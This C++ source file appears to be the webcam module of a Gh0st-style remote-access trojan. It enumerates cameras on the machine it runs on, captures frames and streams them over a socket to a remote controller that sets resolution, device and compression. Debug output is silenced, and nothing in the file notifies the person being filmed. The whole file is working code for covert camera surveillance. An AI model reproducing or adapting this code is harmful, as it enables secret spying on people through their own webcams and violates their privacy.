// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define printf
CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
#ifndef MY_TEST
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
#endif
	m_pCapVideo = NULL;
 	m_bIsWorking = TRUE;
	m_bIsCompress = FALSE;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	m_nOldWidth = 320;
	m_nOldHeight = 240;
	m_fccHandler = 0;
	m_nDevicesNum = 0;
	m_SelectedDevice = 0;
	m_SelectedOld = 0;
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
#ifndef MY_TEST
	delete m_pVideoCap;
#endif
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	if (m_pCapVideo)
	{	
		delete m_pCapVideo;
		m_pCapVideo = NULL;
	}
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
		{
			// 如果解码器初始化正常，就启动压缩功能
#ifndef MY_TEST
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
#endif
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, FALSE);
		break;
	case COMMAND_WEBCAM_RESIZE:
		m_SelectedDevice = *((LPDWORD)(lpBuffer + 9));
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO) + sizeof(int) + m_DeviceList.length();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL || m_pCapVideo == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
#ifdef MY_TEST
	memcpy(lpBuffer + 1, m_pCapVideo->m_lpbmi, sizeof(BITMAPINFO));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO),&m_nDevicesNum,sizeof(int));
	memcpy(lpBuffer + 1 + sizeof(BITMAPINFO) + sizeof(int),m_DeviceList.c_str(),m_DeviceList.length());
	Send(lpBuffer, dwBytesLength);

#else
	memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);
#endif

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
#ifdef MY_TEST
	LPVOID	lpDIB = m_pCapVideo->GetDIB();
	unsigned char* pPos = (unsigned char*)lpDIB;
	int *p_len = (int*)lpDIB;
	int len = *p_len;
	if (lpDIB == NULL)
	{
		return;
	}
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;
	
	UINT	nBufferLen = nHeadLen + len;
	
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	memset(lpBuffer,0,nBufferLen);
	if (lpBuffer == NULL)
		return;
	m_fccHandler = 1324;
	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	m_bIsCompress = FALSE;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));
	
	UINT	nPacketLen = 0;
	{
		memcpy(lpBuffer + nHeadLen, pPos + 4, len);
		nPacketLen = len + nHeadLen;
	}
	//	m_pCapVideo->m_pDec->Decode((unsigned char*)lpBuffer + nHeadLen,len);
	Send(lpBuffer, nPacketLen);
	delete [] lpDIB;
	delete [] lpBuffer;
#else
	LPVOID	lpDIB = m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)
	{
		int	nCompressLen = 0;
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage);
		nPacketLen = m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}

	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
#endif
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
    printf("[ResetScreen] : request stop workthread\n");
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
    printf("[ResetScreen] : m_SelectedDevice = %d,nWidth = %d,nHeight = %d\n",m_SelectedDevice,nWidth, nHeight);	
	// 更新视频大小
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, TRUE);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}
void CVideoManager::StartCapture()
{
    if(m_pCapVideo)
    {
        m_pCapVideo->GrabVideoFrames(TRUE,m_pCapVideo);
    }
}
DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static	DWORD dwLastScreen = GetTickCount();
#ifdef MY_TEST
//	CoInitialize(NULL);
#endif
	CVideoManager *pThis = (CVideoManager *)lparam;
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
    }
    printf("[CVideoManager] : Initialize end\n");
	pThis->sendBITMAPINFO();
    printf("[CVideoManager] : sendBITMAPINFO end\n");
	// 等控制端对话框打开
	pThis->WaitForDialogOpen();
    printf("[CVideoManager] : WaitForDialogOpen end\n");
    pThis->StartCapture();
    printf("[CVideoManager] : StartCapture end\n");
	while (pThis->m_bIsWorking)
	{
		pThis->sendNextScreen();
	}
	// 销毁已经存在实例，方便重新调整
	pThis->Destroy();
    printf("[CVideoManager] : workthread stop\n");
	return 0;
}

bool CVideoManager::Initialize()
{
#ifdef MY_TEST
	bool	bRet = false;
//	CoInitialize(NULL);
	if (m_pCapVideo == NULL)
	{
		m_pCapVideo = new CCaptureVideo();
	}
    if (m_pCapVideo == NULL)
    {
        return false;
    }
	m_DeviceList = "";
	DeviceInfo devInfo;
	if (0 >= (m_nDevicesNum = m_pCapVideo->EnumDevices(&devInfo)))
	{
		delete m_pCapVideo;
		m_pCapVideo = NULL;
		return false;
	}
	DeviceInfo* pInfo = &devInfo;
	while(pInfo)
	{
		m_DeviceList += pInfo->friendlyName.GetBuffer();
		m_DeviceList += "#";
		ResolutionInfo* pResInfo = pInfo->resInfo;
		while(pResInfo)
		{
			m_DeviceList+=pResInfo->Resolution.GetBuffer();
			pResInfo = pResInfo->next;
		}
		m_DeviceList+="$";
		pInfo = pInfo->next;
	}
	if (m_nVedioWidth && m_nVedioHeight)
	{
		if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,m_nVedioWidth,m_nVedioHeight))
		{
			m_pCapVideo->Stop();
			m_pCapVideo->Start(m_SelectedOld,NULL,m_nOldWidth,m_nOldHeight);
			return true;
		}
	}
	else
	{
		m_nOldWidth = m_nVedioWidth = 320;
		m_nOldHeight = m_nVedioHeight = 240;
		if (S_OK != m_pCapVideo->Start(m_SelectedDevice,NULL,320,240))
		{
			m_pCapVideo->Stop();
			for(int i = 0;i < m_nDevicesNum;i++)
			{
				if(S_OK == m_pCapVideo->Start(i,NULL,320,240))
				{
					m_SelectedDevice = i;
					m_SelectedOld = i;
					m_nOldWidth = m_nVedioWidth = 320;
					m_nOldHeight = m_nVedioHeight = 240;
					return true;
				}
				m_pCapVideo->Stop();
			}
			return false;
		}
	}

	m_nOldWidth = m_nVedioWidth;
	m_nOldHeight = m_nVedioHeight;

	m_SelectedOld = m_SelectedDevice;
	bRet = true;
#else
	bool	bRet = false;
	// 正在使用中
	if (!CVideoCap::IsWebCam())
		return false;

	m_pVideoCap = new CVideoCap;

	// 指定了固定大小
	if (m_nVedioWidth && m_nVedioHeight)
	{
		bRet = m_pVideoCap->Initialize(m_nVedioWidth, m_nVedioHeight);
	}
	else
	{
		// 测试H263编码器支持的两种大小,优先考虑
		bRet = m_pVideoCap->Initialize(352, 288);
		if (!bRet)
			bRet = m_pVideoCap->Initialize(176, 144);

		// 尝试系统默认的
		if (!bRet)
			bRet = m_pVideoCap->Initialize();

	}

	// 不要求压缩或者CVideoCap初始化失败
	if (!bRet)
		return bRet;

	// 从这几种解编器中选一种
	DWORD	fccHandlerArray[] = 
	{
		859189837,	// Microsoft H.263 Video Codec
		842225225,	// Intel Indeo(R) Video R3.2
		842289229,	// Microsoft MPEG-4 Video Codec V2
		1684633187	// Cinepak Codec by Radius
	};

	for (int i = 0; i < sizeof(fccHandlerArray) / sizeof(fccHandlerArray[0]); i++)
	{
		m_pVideoCodec = new CVideoCodec;
		if (!m_pVideoCodec->InitCompressor(m_pVideoCap->m_lpbmi, fccHandlerArray[i]))
		{
			delete m_pVideoCodec;
			// 置NULL, 发送时判断是否为NULL来判断是否压缩
			m_pVideoCodec = NULL;
		}
		else
		{
			m_fccHandler = fccHandlerArray[i];
			break;
		}
	}
#endif
	return bRet;
}

void CVideoManager::Destroy()
{
#ifdef MY_TEST
	if (m_pCapVideo)
	{
		m_pCapVideo->GrabVideoFrames(FALSE);
		m_pCapVideo->Stop();	
        delete m_pCapVideo;
        m_pCapVideo = NULL;
	}
	
//	CoUninitialize();
#else
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
#endif
}
